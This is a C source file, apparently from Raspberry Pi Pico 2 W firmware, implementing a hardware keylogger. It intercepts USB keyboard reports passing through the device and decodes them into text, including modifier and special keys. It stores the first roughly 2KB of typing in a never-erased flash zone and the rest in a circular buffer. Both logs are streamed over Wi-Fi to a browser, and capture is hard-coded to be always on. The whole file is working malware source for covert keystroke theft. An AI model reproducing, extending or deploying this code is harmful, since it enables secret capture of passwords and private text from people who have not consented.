#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "hardware/flash.h"
#include "hardware/sync.h"
#include "tusb.h"
#include "lwip/tcp.h"
#include "capture.h"

//--------------------------------------------------------------------+
// Flash layout (Pico 2 W = 4MB flash)
// Last 520KB reserved:
//   [CONFIG  4KB] [PERSIST  4KB] [CIRCULAR 512KB]
//
//   0x37E000 - 0x37EFFF : Config sector  (4KB)
//   0x37F000 - 0x37FFFF : Persistent zone (4KB) - first ~200 words, never auto-erased
//   0x380000 - 0x3FFFFF : Circular capture buffer (512KB)
//--------------------------------------------------------------------+
#define FLASH_TOTAL            (4 * 1024 * 1024)
#define FLASH_CAPTURE_SIZE     (512 * 1024)                // 512 KB circular
#define FLASH_PERSIST_SIZE     FLASH_SECTOR_SIZE           // 4 KB persist zone
#define FLASH_CONFIG_SIZE      FLASH_SECTOR_SIZE           // 4 KB config
// Offsets from flash base (0):
#define FLASH_CONFIG_OFFSET    (FLASH_TOTAL - FLASH_CAPTURE_SIZE - FLASH_PERSIST_SIZE - FLASH_CONFIG_SIZE)
#define FLASH_PERSIST_OFFSET   (FLASH_CONFIG_OFFSET  + FLASH_CONFIG_SIZE)
#define FLASH_CAPTURE_OFFSET   (FLASH_PERSIST_OFFSET + FLASH_PERSIST_SIZE)

// XIP base address for reading flash as memory
#define FLASH_CONFIG_ADDR   (XIP_BASE + FLASH_CONFIG_OFFSET)
#define FLASH_PERSIST_ADDR  (XIP_BASE + FLASH_PERSIST_OFFSET)
#define FLASH_CAPTURE_ADDR  (XIP_BASE + FLASH_CAPTURE_OFFSET)

// Config magic to detect a valid configuration sector
#define CONFIG_MAGIC 0xDEADBEEF

// Stop writing to persist zone after this many bytes (~200 words @ avg 6 chars/word)
// 2048 bytes is conservative - leaves the other 2KB of the 4KB sector as headroom
#define PERSIST_THRESHOLD  2048

typedef struct {
    uint32_t magic;
    uint32_t capture_write_ptr;  // byte offset into circular capture area
    uint32_t persist_write_ptr;  // bytes committed to persist flash zone
    uint8_t  _pad[FLASH_PAGE_SIZE - 12];
} __attribute__((packed)) flash_config_t;

//--------------------------------------------------------------------+
// RAM buffers
//--------------------------------------------------------------------+
#define RAM_BUF_SIZE     8192   // Circular capture RAM buffer (8 KB)
#define PERSIST_RAM_SIZE  256   // Persist RAM buffer (one flash page)

static uint8_t  g_ram_buf[RAM_BUF_SIZE];
static uint32_t g_ram_used = 0;        // bytes written into g_ram_buf

static uint8_t  g_persist_ram_buf[PERSIST_RAM_SIZE];
static uint32_t g_persist_ram_used  = 0; // bytes in persist RAM buffer
static uint32_t g_persist_flash_ptr = 0; // bytes already committed to persist flash
static bool     g_persist_full      = false; // true once PERSIST_THRESHOLD reached

static uint32_t g_flash_write_ptr = 0; // offset into FLASH_CAPTURE area (circular)
static uint32_t g_total_captured  = 0; // total bytes ever captured

static char g_size_str[32];

// Track capture-mode transitions for edge detection
static bool g_was_active = false;

//--------------------------------------------------------------------+
// HID keycode → ASCII table (from TinyUSB)
//--------------------------------------------------------------------+
static const uint8_t keycode2ascii[128][2] = {HID_KEYCODE_TO_ASCII};

//--------------------------------------------------------------------+
// Low-level flash helpers (must run with interrupts disabled, Core 1
// must be stalled via multicore_lockout_start_blocking)
//--------------------------------------------------------------------+
static void flash_safe_erase_sector(uint32_t offset) {
    multicore_lockout_start_blocking();
    uint32_t ints = save_and_disable_interrupts();
    flash_range_erase(offset, FLASH_SECTOR_SIZE);
    restore_interrupts(ints);
    multicore_lockout_end_blocking();
}

static void flash_safe_program(uint32_t offset, const uint8_t *data, size_t len) {
    multicore_lockout_start_blocking();
    uint32_t ints = save_and_disable_interrupts();
    flash_range_program(offset, data, len);
    restore_interrupts(ints);
    multicore_lockout_end_blocking();
}

//--------------------------------------------------------------------+
// Persist config sector (write pointer so we survive reboots)
//--------------------------------------------------------------------+
static void save_config(void) {
    static uint8_t page_buf[FLASH_PAGE_SIZE];
    memset(page_buf, 0xFF, sizeof(page_buf));

    flash_config_t *cfg = (flash_config_t *)page_buf;
    cfg->magic             = CONFIG_MAGIC;
    cfg->capture_write_ptr = g_flash_write_ptr;
    cfg->persist_write_ptr = g_persist_flash_ptr;

    flash_safe_erase_sector(FLASH_CONFIG_OFFSET);
    flash_safe_program(FLASH_CONFIG_OFFSET, page_buf, FLASH_PAGE_SIZE);
}

//--------------------------------------------------------------------+
// Flush persist RAM buffer to flash (appends one page, no erase needed)
//--------------------------------------------------------------------+
static void flush_persist_to_flash(void) {
    if (g_persist_ram_used == 0) return;
    // Pad to full page with 0xFF (harmless - unwritten flash is already 0xFF)
    if (g_persist_ram_used < FLASH_PAGE_SIZE) {
        memset(g_persist_ram_buf + g_persist_ram_used, 0xFF,
               FLASH_PAGE_SIZE - g_persist_ram_used);
    }
    flash_safe_program(FLASH_PERSIST_OFFSET + g_persist_flash_ptr,
                       g_persist_ram_buf, FLASH_PAGE_SIZE);
    g_persist_flash_ptr += FLASH_PAGE_SIZE;
    g_persist_ram_used   = 0;
}

//--------------------------------------------------------------------+
// Flush the RAM buffer to flash (page-aligned, 256-byte chunks)
//--------------------------------------------------------------------+
static void flush_ram_to_flash(void) {
    if (g_ram_used == 0) return;

    // Pad to a full page boundary
    uint32_t pad = FLASH_PAGE_SIZE - (g_ram_used % FLASH_PAGE_SIZE);
    if (pad < FLASH_PAGE_SIZE) {
        memset(g_ram_buf + g_ram_used, 0xFF, pad);
        g_ram_used += pad;
    }

    uint32_t bytes_to_write = g_ram_used;
    uint32_t src = 0;

    while (bytes_to_write > 0) {
        uint32_t page_offset = g_flash_write_ptr % FLASH_CAPTURE_SIZE;

        // Erase if at the start of a new sector
        if (page_offset % FLASH_SECTOR_SIZE == 0) {
            flash_safe_erase_sector(FLASH_CAPTURE_OFFSET + page_offset);
        }

        uint32_t chunk = FLASH_PAGE_SIZE;
        if (chunk > bytes_to_write) chunk = bytes_to_write;

        flash_safe_program(FLASH_CAPTURE_OFFSET + page_offset,
                           g_ram_buf + src, chunk);

        g_flash_write_ptr  = (g_flash_write_ptr + chunk) % FLASH_CAPTURE_SIZE;
        g_total_captured  += chunk;
        src               += chunk;
        bytes_to_write    -= chunk;
    }

    g_ram_used = 0;
    save_config();
}

//--------------------------------------------------------------------+
// Public API
//--------------------------------------------------------------------+
void capture_init(void) {
    g_ram_used          = 0;
    g_total_captured    = 0;
    g_persist_ram_used  = 0;
    g_persist_full      = false;

    // Read write pointers from config sector
    const flash_config_t *cfg = (const flash_config_t *)FLASH_CONFIG_ADDR;
    if (cfg->magic == CONFIG_MAGIC) {
        g_flash_write_ptr   = cfg->capture_write_ptr % FLASH_CAPTURE_SIZE;
        g_total_captured    = g_flash_write_ptr;
        // Guard against garbage from old firmware (no persist field)
        g_persist_flash_ptr = (cfg->persist_write_ptr <= FLASH_PERSIST_SIZE)
                              ? cfg->persist_write_ptr : 0;
        if (g_persist_flash_ptr >= PERSIST_THRESHOLD) {
            g_persist_full = true;
        }
    } else {
        g_flash_write_ptr   = 0;
        g_persist_flash_ptr = 0;
    }

    g_was_active = true;
}

bool capture_is_active(void) {
    return true; // always capturing - no jumper needed
}

void capture_flush(void) {
    if (!g_persist_full && g_persist_ram_used > 0) {
        flush_persist_to_flash();
        save_config();
    }
    if (g_ram_used > 0) {
        flush_ram_to_flash();
    }
}

uint32_t capture_get_write_ptr(void) {
    return g_flash_write_ptr;
}

uint32_t capture_get_total(void) {
    return g_total_captured;
}

void capture_task(void) {
    // Flush persist RAM when it fills up (256 bytes = one page)
    if (!g_persist_full && g_persist_ram_used >= PERSIST_RAM_SIZE) {
        flush_persist_to_flash();
        save_config();
    }
    // Flush circular RAM buffer to flash when 75% full
    if (g_ram_used >= (RAM_BUF_SIZE * 3 / 4)) {
        flush_ram_to_flash();
    }
}

// Route one byte to the right buffer:
//   - Persist zone first, until PERSIST_THRESHOLD is reached
//   - Then circular buffer for everything after
static inline void capture_store_byte(uint8_t ch) {
    if (!g_persist_full) {
        uint32_t persist_total = g_persist_flash_ptr + g_persist_ram_used;
        if (persist_total < PERSIST_THRESHOLD) {
            g_persist_ram_buf[g_persist_ram_used++] = ch;
            if (g_persist_ram_used >= PERSIST_RAM_SIZE) {
                flush_persist_to_flash();
                // Save config each time a page is committed
                // (deferred to capture_task to avoid blocking here)
            }
            return; // byte stored in persist, done
        } else {
            // Persist threshold just reached - flush remaining RAM and seal zone
            if (g_persist_ram_used > 0) flush_persist_to_flash();
            g_persist_full = true;
            // Config will be saved by the next capture_task() call
        }
    }
    // Store in circular capture buffer
    if (g_ram_used < RAM_BUF_SIZE - 1) {
        g_ram_buf[g_ram_used++] = ch;
    }
}

// Store a multi-byte string label (e.g. "[CTRL]") via capture_store_byte
static inline void capture_store_str(const char *s) {
    for (; *s; s++) capture_store_byte((uint8_t)*s);
}

// Called from main.c after popping a report from the bridge,
// only when capture mode is active.
void capture_record_report(hid_keyboard_report_t const *report) {
    if (!capture_is_active()) return;

    static hid_keyboard_report_t prev = {0};

    // 1. Process changed modifiers (CTRL, ALT, GUI, SHIFT)
    uint8_t changed_mods = report->modifier ^ prev.modifier;
    if (changed_mods) {
        uint8_t pressed_mods = changed_mods & report->modifier;
        if (pressed_mods & (KEYBOARD_MODIFIER_LEFTCTRL  | KEYBOARD_MODIFIER_RIGHTCTRL))  capture_store_str("[CTRL]");
        if (pressed_mods & (KEYBOARD_MODIFIER_LEFTALT   | KEYBOARD_MODIFIER_RIGHTALT))   capture_store_str("[ALT]");
        if (pressed_mods & (KEYBOARD_MODIFIER_LEFTGUI   | KEYBOARD_MODIFIER_RIGHTGUI))   capture_store_str("[WIN]");
        if (pressed_mods & (KEYBOARD_MODIFIER_LEFTSHIFT | KEYBOARD_MODIFIER_RIGHTSHIFT)) capture_store_str("[SHIFT]");
    }

    // 2. Decode newly pressed standard keys
    for (uint8_t i = 0; i < 6; i++) {
        uint8_t kc = report->keycode[i];
        if (kc == 0) continue;

        // Skip if key was already held last report
        bool held = false;
        for (uint8_t j = 0; j < 6; j++) {
            if (prev.keycode[j] == kc) { held = true; break; }
        }
        if (held) continue;

        const char *special = NULL;
        switch (kc) {
            case HID_KEY_ENTER:       special = "\n";      break;
            case HID_KEY_ESCAPE:      special = "[ESC]";   break;
            case HID_KEY_BACKSPACE:   special = "[BS]";    break;
            case HID_KEY_TAB:         special = "[TAB]";   break;
            case HID_KEY_SPACE:       special = " ";       break;
            case HID_KEY_CAPS_LOCK:   special = "[CAPS]";  break;
            case HID_KEY_ARROW_RIGHT: special = "[RIGHT]"; break;
            case HID_KEY_ARROW_LEFT:  special = "[LEFT]";  break;
            case HID_KEY_ARROW_DOWN:  special = "[DOWN]";  break;
            case HID_KEY_ARROW_UP:    special = "[UP]";    break;
            case HID_KEY_PAGE_UP:     special = "[PGUP]";  break;
            case HID_KEY_PAGE_DOWN:   special = "[PGDN]";  break;
            case HID_KEY_HOME:        special = "[HOME]";  break;
            case HID_KEY_END:         special = "[END]";   break;
            case HID_KEY_INSERT:      special = "[INS]";   break;
            case HID_KEY_DELETE:      special = "[DEL]";   break;
            case HID_KEY_F1:  special = "[F1]";  break;
            case HID_KEY_F2:  special = "[F2]";  break;
            case HID_KEY_F3:  special = "[F3]";  break;
            case HID_KEY_F4:  special = "[F4]";  break;
            case HID_KEY_F5:  special = "[F5]";  break;
            case HID_KEY_F6:  special = "[F6]";  break;
            case HID_KEY_F7:  special = "[F7]";  break;
            case HID_KEY_F8:  special = "[F8]";  break;
            case HID_KEY_F9:  special = "[F9]";  break;
            case HID_KEY_F10: special = "[F10]"; break;
            case HID_KEY_F11: special = "[F11]"; break;
            case HID_KEY_F12: special = "[F12]"; break;
            default: break;
        }

        if (special) {
            capture_store_str(special);
        } else if (kc < 128) {
            bool shift = report->modifier & (KEYBOARD_MODIFIER_LEFTSHIFT | KEYBOARD_MODIFIER_RIGHTSHIFT);
            uint8_t ch = keycode2ascii[kc][shift ? 1 : 0];
            if (ch) capture_store_byte(ch);
        }
    }

    prev = *report;
}

void capture_stream_to_tcp(struct tcp_pcb *tpcb) {
    // NOTE: Do NOT call flush_ram_to_flash() here - we are inside an lwIP
    // TCP callback. flash_range_erase/program are long blocking operations
    // and calling multicore_lockout_start_blocking() from here is unsafe.
    //
    // Instead: read what is already in flash (written by capture_task),
    // then append whatever is still in the RAM buffer with a TCP_WRITE_FLAG_COPY.

    bool wrote_anything = false;

    // 1. Stream from flash (already committed by capture_task)
    if (g_total_captured > 0) {
        const uint8_t *flash = (const uint8_t *)FLASH_CAPTURE_ADDR;
        uint32_t to_read = (g_total_captured < FLASH_CAPTURE_SIZE)
                           ? g_total_captured : FLASH_CAPTURE_SIZE;

        uint32_t read_ptr = (g_flash_write_ptr + FLASH_CAPTURE_SIZE - to_read)
                            % FLASH_CAPTURE_SIZE;

        if (read_ptr + to_read <= FLASH_CAPTURE_SIZE) {
            tcp_write(tpcb, flash + read_ptr, to_read,
                      g_ram_used ? TCP_WRITE_FLAG_MORE : 0);
        } else {
            uint32_t part1 = FLASH_CAPTURE_SIZE - read_ptr;
            tcp_write(tpcb, flash + read_ptr, part1, TCP_WRITE_FLAG_MORE);
            tcp_write(tpcb, flash, to_read - part1,
                      g_ram_used ? TCP_WRITE_FLAG_MORE : 0);
        }
        wrote_anything = true;
    }

    // 2. Append RAM buffer (not yet committed to flash)
    if (g_ram_used > 0) {
        tcp_write(tpcb, g_ram_buf, g_ram_used, TCP_WRITE_FLAG_COPY);
        wrote_anything = true;
    }

    // 3. Always write something so the browser gets a complete HTTP response
    if (!wrote_anything) {
        const char *empty = "(no keystrokes captured yet - type something!)";
        tcp_write(tpcb, empty, strlen(empty), TCP_WRITE_FLAG_COPY);
    }
}

// Stream persistent zone to TCP (called by HTTP server for the top panel)
void capture_stream_persist_to_tcp(struct tcp_pcb *tpcb) {
    uint32_t flash_bytes = g_persist_flash_ptr;
    uint32_t ram_bytes   = g_persist_ram_used;

    if (flash_bytes == 0 && ram_bytes == 0) {
        const char *empty = "(persistent zone empty - first ~200 words will appear here)";
        tcp_write(tpcb, empty, strlen(empty), TCP_WRITE_FLAG_COPY);
        return;
    }

    // Stream flash-committed persist bytes (zero-copy XIP)
    if (flash_bytes > 0) {
        const uint8_t *flash = (const uint8_t *)FLASH_PERSIST_ADDR;
        tcp_write(tpcb, flash, flash_bytes, ram_bytes ? TCP_WRITE_FLAG_MORE : 0);
    }
    // Append any bytes still in the persist RAM buffer
    if (ram_bytes > 0) {
        tcp_write(tpcb, g_persist_ram_buf, ram_bytes, TCP_WRITE_FLAG_COPY);
    }
}

// Erase only the circular capture buffer - persistent zone untouched
void capture_clear(void) {
    g_ram_used        = 0;
    g_flash_write_ptr = 0;
    g_total_captured  = 0;

    for (uint32_t off = 0; off < FLASH_CAPTURE_SIZE; off += FLASH_SECTOR_SIZE) {
        flash_safe_erase_sector(FLASH_CAPTURE_OFFSET + off);
    }
    save_config();
}

// Erase only the persistent zone - circular buffer untouched
void capture_clear_persist(void) {
    flash_safe_erase_sector(FLASH_PERSIST_OFFSET);
    g_persist_flash_ptr = 0;
    g_persist_ram_used  = 0;
    g_persist_full      = false;
    save_config();
}

